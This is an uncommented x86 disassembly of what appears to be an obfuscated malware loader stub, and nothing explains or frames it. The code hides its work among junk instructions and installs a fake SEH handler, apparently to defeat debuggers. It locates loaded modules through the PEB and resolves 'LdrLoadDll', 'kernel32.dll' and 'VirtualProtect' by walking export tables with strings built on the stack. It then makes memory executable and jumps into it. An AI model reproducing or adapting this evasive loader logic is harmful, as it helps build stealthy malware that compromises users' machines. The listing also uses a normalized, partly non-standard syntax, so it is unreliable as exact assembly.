_start
pushad
push ecx
xor ecx [ esp ]
or esi esi
adc esp 0x4
push esp
or edi edi
sbb ecx 0xffffffff
mov ebx [ esp ]
add esp 0x4
inc ecx
sub ebx 0x4
or eax eax
adc ecx 0x1
neg ecx
call $+5
sub [ ebx ] ecx
retn
sub_17602035
and ecx ecx
mov edx 0x0
adc edx 0x0
xor ecx ecx
add ecx edx
sub eax eax
add eax edx
and ebx ebx
sbb cl 0x1
stc
sbb cl 0x0
mov ch cl
call $+5
and edx edx
sbb eax 0xffffffff
xor esi esi
xor esi [ esp ]
movzx ebx [ esi + eax - 0x2 ]
call $+5
mov [ esp ] ebx
sub ebx ecx
pop ebx
jne r-xdata
add [ esp ] edx
jmp [ esp ]
mov edx 0x0
add edx eax
sub_176020c7
push [ fs : 0x0 ]
and ecx ecx
adc esi ebx
and eax 0x0
or eax 0xffff
not edi
and edi edi
adc esi ebx
mov [ fs : 0x0 ] esp
and esi edi
add esi ebx
or esi esi
jno r-xdata
call $+5
call sub_176020c7
push edi
xor edi edi
or edi [ esp + 0x10 ]
inc [ edi + 0xb8 ]
or eax eax
sbb [ edi + 0xb8 ] 0xffffffff
mov edi [ esp ]
add esp 0x4
push eax
xor eax [ esp ]
and esi esi
adc esp 0x4
retn 0x10
pop ecx
mov ecx 0x0
or ecx [ esp ]
mov [ fs : 0x0 ] ecx
add esp 0x8
mov ebx esi
and ecx 0x0
or ecx [ esi + 0x3c ]
or esi esi
adc esi ecx
mov ecx 0x0
add ecx 0x4550
xor edx edx
add edx [ esi ]
push edx
sub edx ecx
pop edx
jne r-xdata
jmp [ esp ]
popad
or edx edx
mov eax 0x0
adc eax 0x1
retn 0xc
mov ecx 0x0
xor ecx [ esi + 0x78 ]
mov esi ecx
add esi ebx
push esi
mov ecx 0x0
sub ecx [ esi + 0x20 ]
neg ecx
push ecx
pop esi
add esi ebx
add esp 0xfffffffc
mov [ esp ] ebx
add esp 0xfffffffc
mov [ esp ] esi
pop esi
add esp 0x4
mov ebx [ esp - 0x4 ]
xor edx edx
sub eax eax
add eax esi
mov ecx 0x0
or ecx [ esi ]
push ecx
pop esi
call $+5
test ebx ebx
mov ebp 0x0
adc ebp esp
and edx edx
adc esi ebx
call $+5
mov [ esp ] 0x6c6c
add esp 0xfffffffc
mov [ esp ] 0x4464616f
sub esp 0x4
mov [ esp ] 0x4c72644c
mov edi 0x0
or edi esp
xor ecx ecx
xor ecx 0xb
[ esi ] [ edi ]
je r-xdata
test ebx ebx
sbb esi ebx
xor ecx ecx
mov ecx [ esi ]
mov edx 0x5a4d
and ecx eax
call $+5
mov [ esp ] edx
sub edx ecx
pop edx
je r-xdata
and esp 0x0
or esp ebp
add esp 0x4
mov esi [ esp - 0x4 ]
sub esp 0x4
mov [ esp ] ebx
push edx
pop edi
add esp 0x4
mov ebx [ esp - 0x4 ]
add esp 0x4
mov esi [ esp - 0x4 ]
mov eax esi
and ecx 0x0
or ecx [ esi + 0x24 ]
sub esi esi
add esi ecx
add esi ebx
mov ecx 0x0
or ecx [ esi + edi * 2 ]
and ecx 0xffff
sub edi edi
add edi ecx
and ecx 0x0
add ecx [ eax + 0x10 ]
sub edi ecx
inc edi
and edx edx
mov esi 0x0
adc esi [ eax + 0x1c ]
or ebx ebx
adc esi ebx
and ecx 0x0
or ecx [ esi + edi * 4 ]
add ebx ecx
mov ebp 0x0
add ebp esp
call $+5
mov [ esp ] ecx
xor ecx [ esp ]
and esi esi
adc esp 0x4
push ecx
xor esi esi
or esi esp
add esp 0xfffffffc
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] 0x6c006c
push 0x64002e
add esp 0xfffffffc
mov [ esp ] 0x320033
sub esp 0x4
mov [ esp ] 0x6c0065
push 0x6e0072
call $+5
mov [ esp ] 0x65006b
push esp
add esp 0xfffffffc
mov [ esp ] 0x1a0018
mov edx 0x0
sub edx esp
neg edx
push esi
add esp 0xfffffffc
mov [ esp ] edx
call $+5
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ecx
sub esp 0x4
mov [ esp ] ebx
push esi
add esp 0x4
mov esi [ esp - 0x4 ]
add esp 0x4
mov ebx [ esp - 0x4 ]
call ebx
and eax 0x0
add eax [ esi ]
push eax
pop ecx
or edi edi
mov edx 0x0
adc edx [ fs : 0x30 ]
mov ebx 0x0
xor ebx [ edx + 0x10 ]
mov [ ebx + 0x18 ] ecx
mov esp 0x0
sub esp ebp
neg esp
and edx 0x0
or edx [ fs : 0x30 ]
xor ebx ebx
add ebx [ edx + 0x10 ]
mov esi 0x0
add esi [ ebx + 0x18 ]
and ebx 0x0
or ebx esi
push [ esi + 0x3c ]
pop ecx
add esi ecx
and ecx 0x0
or ecx [ esi + 0x78 ]
mov esi ecx
add esi ebx
call $+5
mov [ esp ] esi
xor ecx ecx
add ecx [ esi + 0x20 ]
and esi 0x0
or esi ecx
add esi ebx
add esp 0xfffffffc
mov [ esp ] ebx
push esi
add esp 0x4
mov esi [ esp - 0x4 ]
mov ebx [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] edx
xor edx [ esp ]
sub esp 0xfffffffc
mov eax esi
mov ecx 0x0
or ecx [ esi ]
mov esi 0x0
xor esi ecx
call $+5
mov ebp esp
add esi ebx
push 0x7463
push 0x65746f72
call $+5
mov [ esp ] 0x506c6175
sub esp 0x4
mov [ esp ] 0x74726956
mov edi esp
and ecx 0x0
add ecx 0xf
[ esi ] [ edi ]
je r-xdata
inc edx
test esi esi
adc eax 0x4
xor esi esi
add esi [ eax ]
mov esp ebp
jmp [ esp ]
test edi edi
mov esp 0x0
adc esp ebp
mov esi [ esp ]
add esp 0x4
sub esp 0x4
mov [ esp ] ebx
push edx
pop edi
pop ebx
pop esi
xor eax eax
or eax esi
push [ esi + 0x24 ]
pop ecx
and esi 0x0
add esi ecx
test edx edx
adc esi ebx
mov ecx [ esi + edi * 2 ]
and ecx 0xffff
and edi 0x0
add edi ecx
mov ecx [ eax + 0x10 ]
sub edi ecx
or edi edi
adc edi 0x1
mov esi 0x0
sub esi [ eax + 0x1c ]
neg esi
add esi ebx
xor ecx ecx
or ecx [ esi + edi * 4 ]
add ebx ecx
or eax eax
mov eax 0x0
adc eax 0x1000
call $+5
pop esi
and esi 0xfffff000
and edi edi
adc esi eax
test esi esi
adc esi eax
call $+5
mov [ esp ] esi
and edx 0x0
or edx 0x4
call $+5
add esi eax
sub ecx ecx
add ecx [ esi ]
add edx 0xffffffff
je r-xdata
and ecx ecx
adc edx 0x1
add eax 0x4
and esi 0x0
or esi [ eax ]
and esp 0x0
or esp ebp
jmp [ esp ]
add esp 0x4
mov ecx [ esp - 0x4 ]
pop esi
add esp 0xfffffffc
mov [ esp ] ecx
push esp
add esp 0xfffffffc
mov [ esp ] 0x40
call $+5
mov [ esp ] 0x45c3
call $+5
mov [ esp ] esi
call $+5
mov [ esp ] ebx
push esi
pop esi
pop ebx
call $+5
pop eax
or ebx ebx
adc eax 0x19
add esp 0xfffffffc
mov [ esp ] eax
add esp 0xfffffffc
mov [ esp ] ebp
push esp
pop ebp
add ebx 0x5
jmp ebx
jmp [ esp ]
